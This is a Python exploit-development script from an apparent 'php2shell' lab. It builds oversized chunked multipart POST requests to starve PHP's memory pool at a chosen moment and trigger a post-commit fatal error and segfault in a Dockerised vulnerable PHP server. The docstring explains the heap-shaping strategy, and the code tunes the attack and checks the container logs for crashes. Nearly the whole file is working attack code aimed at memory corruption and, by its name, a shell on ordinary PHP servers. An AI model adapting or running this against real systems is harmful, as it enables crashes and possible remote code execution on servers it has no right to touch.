#!/usr/bin/env python3
"""php2shell lab, oom20: starve the pool — no seed donors.

oom19 dbg proof: lead=15000 V=2048 completes at peak==limit — key run is
SELF-FINANCING (freed param ≈ key+value need, same bytes). Only real drains:
  1. arData doubling reallocs: donor(old)=half of new -> NET drain ~ half
     of final size (~36KB for 873 elements) — UNMATCHABLE
  2. huge-bin allocs (>=8-12KB): fresh mmap, no free list (oom13's 12288)
Kill design: REMOVE the 2x256KB poison seeds (they sat in the pool absorbing
every arData doubling + every mismatch). Then the arData doubling cascade
itself drains past the wall mid-key-run -> key alloc (328B, small-bin, but
pool EMPTY) -> fatal inside add_to_hash = post-commit = THE BUG.

Shape: 9 A-units + fill to rem + key run 600 (names 300B, V=64 thin).
Leads: 25/20/15/10/8/6KB. Gate: fatal with alloc <= 2000 (key/arData).
"""
import re
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import part, POISON, UNIT, alloc_n  # noqa: E402

KEYRUN = 600
V = 64

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def build(rem: int) -> list:
    ps = []
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))
    fill = POISON * UNIT
    total = 475 * UNIT + rem - 9 * UNIT
    u = 0
    while total >= UNIT:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * total))
    for k in range(KEYRUN):
        nm = POISON * (280 + (k % 40)) + b"%d" % k
        ps.append(part(nm, POISON * V))
    return ps

def send(port: int, parts: list):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=120)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def segcheck():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "120"],
                       capture_output=True, text=True)
    return [l for l in (r.stdout + r.stderr).splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    def log(*a, **k):
        k.pop("flush", None)
        print(*a, flush=True)
    for lead in (25000, 20000, 15000, 10000, 8000, 6000):
        restart()
        fatal, text = send(port, build(lead))
        a = alloc_n(text) if fatal else None
        tag = ""
        if fatal:
            if a is not None and a <= 2000:
                tag = "  *** KEY/BUCKET DEATH — SEGFAULT CHECK ***"
            elif a is not None and 32768 <= a <= 65536:
                tag = "  (arData doubling death)"
        log(f"lead={lead}: fatal={fatal} alloc={a}{tag}", flush=True)
        if tag.startswith("  ***"):
            time.sleep(1.5)
            hits = segcheck()
            for h in hits:
                log("SEGV: " + h)
            if hits:
                log("*** SEGFAULT REPRODUCED — chain complete ***")
                return
    log("== oom20 done ==")

if __name__ == "__main__":
    main()
